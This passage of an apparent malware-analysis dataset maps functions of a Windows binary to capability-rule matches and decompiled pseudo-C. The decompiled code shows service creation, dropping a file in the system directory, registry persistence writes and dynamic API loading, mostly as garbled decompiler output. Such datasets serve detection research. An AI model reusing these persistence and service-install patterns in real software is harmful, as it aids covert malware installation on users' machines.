            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040103e)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401000(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    // [00] -r-x section size 16384 named .text\n    iVar1 = fcn.004030e0(arg_8h, arg_ch, &var_8h, &var_4h);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x58) = var_4h;\n        fcn.004030e0(arg_8h, arg_ch, &var_8h, &var_4h);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 189
    },
    "004014a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004014d4) overlaps instruction at (ram,0x004014cf)\n// \n// WARNING: Removing unreachable block (ram,0x004014bf)\n// WARNING: Removing unreachable block (ram,0x004014c7)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid fcn.004014a0(uint *param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack108;\n    uint uStack107;\n    uint uStack8;\n    \n    uStack8 = 0;\n    uStack108 = 0;\n    puVar2 = &uStack107;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00401520(&uStack108, &uStack8);\n    fcn.00402e70(&uStack108, uStack8, 0x406010, 0xa400);\n    *param_1 = 0x406010;\n    *param_2 = 0xa400;\n    return;\n}\n",
        "token_count": 300
    },
    "00401520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040162e) overlaps instruction at (ram,0x0040162d)\n// \n// WARNING: Removing unreachable block (ram,0x0040160f)\n// WARNING: Removing unreachable block (ram,0x004015b7)\n// WARNING: Removing unreachable block (ram,0x0040162e)\n// WARNING: Removing unreachable block (ram,0x004015fa)\n// WARNING: Removing unreachable block (ram,0x00401619)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401520(uchar *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint16_t uVar2;\n    uint32_t in_ECX;\n    uint32_t unaff_EBX;\n    char *unaff_EDI;\n    char *pcVar3;\n    ushort in_SS;\n    uint8_t in_AF;\n    bool bVar4;\n    ushort uStack22;\n    int16_t iStack20;\n    int16_t iStack18;\n    \n    iStack20 = in_ECX;\n    iStack18 = iStack20;\n    uVar2 = iStack20 - 1U & unaff_EDI | 0x61be;\n    *arg_8h = 0xdf;\n    if ((uVar2 < 1) || (0 < uVar2)) {\n        arg_8h[1] = 0xcb;\n    }\n    else {\n        unaff_EBX = unaff_EBX + in_ECX;\n    }\n    uVar2 = in_EAX;\n    arg_8h[2] = 0xdd;\n    iStack20 = unaff_EBX;\n    arg_8h[3] = 0x97;\n    arg_8h[4] = 0x48;\n    arg_8h[5] = 0x86;\n    bVar4 = (arg_8h & 0x66) == 0;\n    arg_8h[6] = 0xd;\n    arg_8h[7] = 0x21;\n    if (!bVar4) {\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n        if (bVar4) {\n            unaff_EDI = CONCAT22(iStack20, in_SS);\n            uStack22 = 0x47;\n            iStack20 = 0;\n            *(in_EAX + 0x8b660c7e) = *(in_EAX + 0x8b660c7e) | unaff_EBX;\n            in_EAX = (in_EAX * arg_8h[-0x75]) / unaff_EDI[4] & 0xff;\n            goto code_r0x004015e7;\n        }\n    }\n    arg_8h[8] = 0x98;\n    if ((bVar4) || (!bVar4)) {\n        arg_8h[9] = 0xc;\n        goto code_r0x0040160a;\n    }\ncode_r0x004015e7:\n    *(&uStack22 + unaff_EDI) = *(&uStack22 + unaff_EDI) | in_ECX;\n    *(unaff_EDI + -0x41) = *(unaff_EDI + -0x41) - arg_8h;\n    uVar2 = CONCAT11(0x13, in_EAX);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        pcVar3 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = pcVar3 + 1;\n        cVar1 = uVar2 + 0x18107d5f;\n        *pcVar3 = cVar1;\n        uVar2 = cVar1 + (uVar2 + 0x18107d5f >> 8) * 'y';\n        bVar4 = uVar2 == 0;\ncode_r0x0040160a:\n        arg_8h[10] = 0x5a;\n        arg_8h[0xb] = 0xde;\n        if ((!bVar4) && (bVar4)) break;\n        arg_8h[0xc] = 0xb5;\n        arg_8h[0xd] = 0xfb;\n        arg_8h[0xe] = 0xf9;\n        if ((in_ECX < '\\x02') || ('\\x01' < in_ECX)) {\n            arg_8h[0xf] = 0;\n            *arg_ch = 0x10;\n            return;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar2 = CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f;\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    do {\n    // WARNING: Do nothing block with infinite loop\n    } while( true );\n}\n",
        "token_count": 1152
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004018f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004019f0) overlaps instruction at (ram,0x004019ed)\n// \n\nuint __cdecl fcn.004018f0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint *puVar2;\n    uchar uVar3;\n    bool bVar4;\n    char cVar5;\n    char cVar6;\n    uchar *puStack552;\n    uint uStack548;\n    uchar lpBuffer;\n    uint var_20fh;\n    uchar s;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    s = 0;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puStack552 = &lpBuffer;\n    uStack548 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    cVar6 = SCARRY4(&stack0xfffffdc8, 0x10);\n    cVar5 = &puStack552 < 0;\n    uVar3 = *0x10 == 0x228;\n    fcn.00401c20(&var_4h, &var_8h);\n    fcn.00401a10();\n    if ((!uVar3 && cVar6 == cVar5) && (uVar3 || cVar6 != cVar5)) {\n        var_8h = extraout_ECX;\n    }\n    iVar1 = fcn.004020e0(&s, 0x420448, var_4h, var_8h);\n    bVar4 = iVar1 == 0;\n    if (!bVar4) {\n        if ((!bVar4) && (bVar4)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        fcn.00402690(&s, 0xffffffff);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 600
    },
    "00401bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401bc0(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00402800(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 106
    },
    "00401c20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c72) overlaps instruction at (ram,0x00401c71)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401c20(uint *arg_8h, uint *arg_ch)\n\n{\n    char *pcVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint in_EDX;\n    int32_t unaff_EBX;\n    uint *puVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_8h_00;\n    uchar *arg_ch_00;\n    uchar *arg_10h;\n    uchar var_68h;\n    uint var_67h;\n    uchar *var_4h;\n    \n    arg_ch_00 = &stack0xfffffffc;\n    arg_10h = &stack0xffffff88;\n    var_4h = NULL;\n    var_68h = 0;\n    puVar8 = &var_67h;\n    for (iVar7 = 0x18; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    puVar2 = puVar8 + 3;\n    *(puVar8 + 2) = 0;\n    bVar9 = in_EDX >> 8 < 0x36;\n    iVar7 = unaff_EBX;\n    puVar5 = fcn.00401cb0();\n    if (!bVar9) {\n        if (bVar9) goto code_r0x00401c62;\n    }\n    iVar7 = 0x410414;\n    puVar5 = &var_68h;\n    arg_ch_00 = puVar5;\n    arg_10h = var_4h;\ncode_r0x00401c62:\n    uVar4 = puVar5;\n    cVar3 = uVar4 - *puVar2;\n    arg_8h_00 = (in_NT & 1) * 0x4000 | SBORROW1(uVar4, *puVar2) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                (cVar3 < '\\0') * 0x80 | (cVar3 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar3) & 1U) == 0) * 4\n                | uVar4 < *puVar2 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                (in_AC & 1) * 0x40000;\n    iVar6 = func_0x10187be4();\n    pcVar1 = unaff_EBX + 0x68fc55;\n    *pcVar1 = *pcVar1 + iVar6;\n    *(iVar6 + 0x14) = *(iVar6 + 0x14) + (pcVar1 >> 8);\n    fcn.00402e70(arg_8h_00, arg_ch_00, arg_10h, iVar7);\n    *arg_8h = 0x410414;\n    *arg_ch = 0x10000;\n    return;\n}\n",
        "token_count": 863
    },
    "00401cb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401dad) overlaps instruction at (ram,0x00401da9)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __thiscall fcn.00401cb0(int32_t param_1, uint *param_2)\n\n{\n    code *pcVar1;\n    uint8_t uVar2;\n    char cVar6;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    uint *puVar4;\n    uint32_t uVar5;\n    char extraout_CL;\n    uint16_t uVar7;\n    int32_t iVar8;\n    char extraout_DL;\n    char extraout_DH;\n    int32_t unaff_EBX;\n    char *pcVar9;\n    uchar *puVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    uint8_t in_AF;\n    bool bVar15;\n    bool bVar16;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar17;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uchar *arg_ch;\n    \n    while( true ) {\n        puVar10 = &stack0xfffffffc;\n        *param_2 = 0xe3;\n        *(param_2 + 1) = 3;\n        *(param_2 + 2) = 0xdd;\n        uVar7 = param_1 | 0x31fd;\n        *(param_2 + 3) = 0x4d;\n        if ((uVar7 < 1) || (0 < uVar7)) break;\n        in_AF = 9 < (in_EAX & 0xf) | in_AF;\n        in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, in_EAX + in_AF * '\\x06') & 0xff0f;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(param_2 + 1) = 0xf1;\n    *(param_2 + 5) = 0x5e;\n    puVar12 = param_2;\ncode_r0x00401d74:\n    *(puVar12 + 6) = 0x7c;\ncode_r0x00401d97:\n    *(puVar12 + 7) = 0xa2;\n    puVar4 = puVar12;\n    do {\n        *(puVar4 + 2) = 0x9c;\n        cVar6 = in_EAX >> 8;\n        uVar2 = in_EAX;\n        uVar7 = CONCAT11((cVar6 - unaff_EBX) + 'M', uVar2) & 0x26ae;\n        bVar17 = SBORROW2(uVar7, 1);\n        uVar3 = uVar7 - 1;\n        bVar16 = uVar3 < 0;\n        bVar15 = uVar3 == 0;\n        bVar14 = (POPCOUNT(uVar3 & 0xff) & 1U) != 0;\n        *(puVar4 + 9) = 0xa0;\n        puVar12 = puVar4;\n        if ((!bVar15 && uVar7 != 0) && (bVar15 || uVar7 == 0)) {\n            in_AF = 9 < (uVar2 & 0xf) | in_AF;\n            in_EAX = in_EAX & 0xffff0000 | CONCAT11(cVar6 + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f;\n            if (param_1 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            goto code_r0x00401d74;\n        }\n        *(puVar4 + 10) = 0x2e;\n        if ((bVar14) && (!bVar14)) {\n            puVar12 = *param_2;\n            *param_2 = puVar4;\n            puVar10 = puVar10 + -*(puVar10 + 0x5f9dff63);\n            if (puVar10 < 0) goto code_r0x00401d97;\n            bVar17 = false;\n            bVar16 = puVar12 < 0;\n            bVar15 = puVar12 == NULL;\n            if (!bVar16) {\n                *(unaff_EBX + 0x4d8b1c45) = *(unaff_EBX + 0x4d8b1c45) | 0x18;\n                arg_ch = *0x10;\n                puVar4 = fcn.00403f60(param_1, in_EAX, 0x420458, 7);\n                bVar14 = puVar4 == NULL;\n                if (bVar14) {\n                    return NULL;\n                }\n                if (!bVar14) {\n                    if (bVar14) {\n                        *param_2 = *puVar12;\n                        uVar11 = CONCAT11(0xdf, puVar4);\n                        pcVar9 = puVar4 & 0xffff0000 | uVar11;\n                        puVar10 = 0xb9e181d0;\n                        *pcVar9 = *pcVar9 + extraout_DH;\n                        puVar4 = puVar4 & 0xffff0000 | uVar11 & 0xffffff00 | puVar4 + extraout_DH;\n                        puVar12 = param_2 + 2;\n                        param_2[1] = *0x10;\n                        goto code_r0x00401ec6;\n                    }\n                }\n                *0x10 = NULL;\n                puVar10[-0x20] = 0;\n                puVar12 = puVar10 + -0x1f;\n                for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\ncode_r0x00401ec6:\n                pcVar1 = _sym.imp.MSVCRT.dll_rand;\n                *puVar12 = *0x10;\n                *(puVar12 + 2) = 0;\n                uVar11 = 0;\n                do {\n                    uVar5 = (*pcVar1)();\n                    uVar5 = uVar5 & 0x800000ff;\n                    if (uVar5 < 0) {\n                        uVar5 = (uVar5 - 1 | 0xffffff00) + 1;\n                    }\n                    puVar10[uVar11 - 0x20] = uVar5;\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x20);\n                bVar14 = false;\n                bVar15 = (CONCAT11((uVar5 >> 8) - extraout_CL, uVar5 + '\\x01') - 1U & 0x637b) != 0;\n                puVar12 = puVar10 + -0x20;\n                puVar13 = puVar4;\n                for (iVar8 = 8; iVar8 != 0; iVar8 = iVar8 + -1) {\n                    *puVar13 = *puVar12;\n                    puVar12 = puVar12 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n                if ((bVar15) && (!bVar15)) {\n                    do {\n    // WARNING: Do nothing block with infinite loop\n                    } while( true );\n                }\n                uVar11 = 0x401f4b;\n                uVar2 = fcn.004016f0(*(puVar10 + 8), *(puVar10 + 0xc), *(puVar10 + 0x10), *(puVar10 + 0x14), \n                                     puVar10 + -0x20, 0x20);\n                if ((bVar14) || (uVar11 = uVar11 & 0xffff | puVar13 << 0x10,  !bVar14)) {\n                    uVar11 = *(puVar10 + 0x1c);\n                    arg_ch = *(puVar10 + 0x18);\n                }\n                cVar6 = uVar2 - *puVar13;\n                uVar5 = (in_NT & 1) * 0x4000 | SBORROW1(uVar2, *puVar13) * 0x800 | (in_IF & 1) * 0x200 |\n                        (in_TF & 1) * 0x100 | (cVar6 < '\\0') * 0x80 | (cVar6 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                        ((POPCOUNT(cVar6) & 1U) == 0) * 4 | uVar2 < *puVar13 | (in_ID & 1) * 0x200000 |\n                        (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n                func_0x10187ed5(uVar5, arg_ch, uVar11);\n                *(puVar4 + 0x558b1c9f) = *(puVar4 + 0x558b1c9f) - extraout_DL;\n                fcn.00401000(uVar5, arg_ch);\n                return 0x1;\n            }\n        }\n        *(puVar12 + 0xb) = 99;\n        if ((bVar15 || bVar17 != bVar16) || (!bVar15 && bVar17 == bVar16)) {\n            puVar12 = *(puVar10 + 0xc);\n            *puVar12 = 0xc;\n            return puVar12;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        puVar4 = puVar12;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 2311
    },
    "004020e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004020e0(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    ushort uVar2;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = iVar1;\n    (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar2);\n    (*_sym.imp.MSVCRT.dll_fflush)(uVar2);\n    (*_sym.imp.MSVCRT.dll_fclose)(uVar2);\n    return 1;\n}\n",
        "token_count": 149
    },
    "00402290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022a3) overlaps instruction at (ram,0x004022a1)\n// \n\nuint __cdecl fcn.00402290(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    uint uVar1;\n    uint in_ECX;\n    char *in_EDX;\n    \n    *in_EDX = *in_EDX + (in_ECX >> 8);\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    fcn.00401090(arg_8h_00, arg_8h);\n    uVar1 = fcn.004041c0(arg_8h_00, arg_8h, arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar1;\n}\n",
        "token_count": 197
    },
    "004025a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.004025a0(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uchar *puStack296;\n    uchar uStack276;\n    uint uStack275;\n    uint uStack271;\n    uint uStack267;\n    ushort uStack263;\n    uchar uStack261;\n    uchar uStack260;\n    uint uStack259;\n    \n    uStack275 = 0;\n    uStack271 = 0;\n    uStack267 = 0;\n    uStack276 = 0;\n    uStack263 = 0;\n    uStack260 = 0;\n    uStack261 = 0;\n    puVar4 = &stack0xfffffefd;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    fcn.00402170();\n    puStack296 = 0x4025ea;\n    fcn.00402c50(&stack0xfffffeec, 5);\n    pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack296 = &stack0xfffffefc;\n    puStack300 = 0x402604;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack296 = 0x402617;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack300 = &stack0xfffffee4;\n    puStack296 = 0x10;\n    uStack304 = 1;\n    uStack308 = 0x420934;\n    uStack312 = 0x42076c;\n    uStack316 = 0x80000000;\n    uStack320 = 0x402637;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack320 = 0x4b;\n    uStack324 = 0x4207a0;\n    uStack328 = 1;\n    uStack332 = 0x420934;\n    (*pcVar2)(0x80000000, &stack0xfffffedc);\n    (*pcVar1)(&stack0xfffffec4, 0x4207ec, &stack0xfffffeb4);\n    (*pcVar2)(0x80000000, &stack0xfffffec4, 0x420828, 1, 0x420830, 0x14);\n    return;\n}\n",
        "token_count": 646
    },
    "00402bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00402bb0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_EDI;\n    char *pcVar4;\n    float10 extraout_ST0;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00403db0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        *(unaff_EDI + 0x1c) = extraout_ST0;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x420608, 0x420648, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 301
    },
    "00402c50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402c50(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00402cc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402cc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402ee0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00402db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00402db0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f49) overlaps instruction at (ram,0x00403f45)\n// \n// WARNING: Removing unreachable block (ram,0x00403f35)\n// WARNING: Removing unreachable block (ram,0x00403f3f)\n\nbool __cdecl fcn.00403ea0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &var_4h);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h, arg_10h, 0, arg_14h, arg_18h, arg_1ch);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 257
    },
    "00404100": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040417d) overlaps instruction at (ram,0x0040417c)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.00404100(uint param_1, uint param_2, uint param_3)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t extraout_CH;\n    uint16_t unaff_BX;\n    bool bVar6;\n    unkbyte6 Var7;\n    uint var_4h;\n    \n    puVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    *0x42095c = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    bVar6 = ((unaff_BX & 0xff00 | unaff_BX | *0x42095c >> 8) & 0x94f) == 0;\n    Var7 = (*pcVar2)();\n    uVar4 = Var7;\n    *0x420960 = uVar4;\n    if (!bVar6) {\n        if (bVar6) {\n            uVar1 = in(Var7 >> 0x20);\n            *puVar3 = uVar1;\n            if (&stack0xffffffd8 < 1) {\n                iVar5 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)\n                                  (param_1, param_2, param_2, 0xf01ff, 1, 0, 1, param_3, 0, 0, 0, 0, 0);\n                if (iVar5 != 0) {\n                    if (-1 < iVar5) {\n                        if (-1 >= iVar5) {\n                            out(0xc4, iVar5);\n                            puVar3[1] = iVar5;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar5);\n                    return 1;\n                }\n                return 0;\n            }\n            uVar4 = uVar4 ^ 0xdee0ed6d;\n            uVar4 = uVar4 & 0xffff0000 | uVar4 + (uVar4 >> 8) * -0x31;\n            *(uVar4 + 0x44) = *(uVar4 + 0x44) ^ extraout_CH;\n            *0x420964 = uVar4 - 0xa8ffbe & 0xffffff00 | -(0xa8ffbd < uVar4);\n            goto code_r0x00404185;\n        }\n    }\n    *0x420964 = (*pcVar2)();\ncode_r0x00404185:\n    if (((*0x42095c != 0) && (*0x420960 != 0)) && (*0x420964 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 676
    },
    "004041c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041e7) overlaps instruction at (ram,0x004041e6)\n// \n\nbool __cdecl fcn.004041c0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uchar uVar1;\n    uint32_t in_EAX;\n    int32_t iVar2;\n    uint in_ECX;\n    char *in_EDX;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    \n    if ((!in_OF) && (in_OF)) {\n        uVar1 = in(in_EDX);\n        *unaff_EDI = uVar1;\n        unaff_EDI = unaff_EDI + 1;\n        if (!in_CF && !in_ZF) {\n            iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x420608, 0x42064c, 4, in_EAX & 0xffffff04, 4);\n            return iVar2 == 0;\n        }\n    }\n    *in_EDX = *in_EDX + (in_ECX >> 8);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, 0x6a10458b, 0, 0, 0, 0x56)\n    ;\n    if (iVar2 == 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n        out(0xc4, iVar2);\n        *unaff_EDI = iVar2;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return true;\n}\n",
        "token_count": 405
    },
    "00401090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
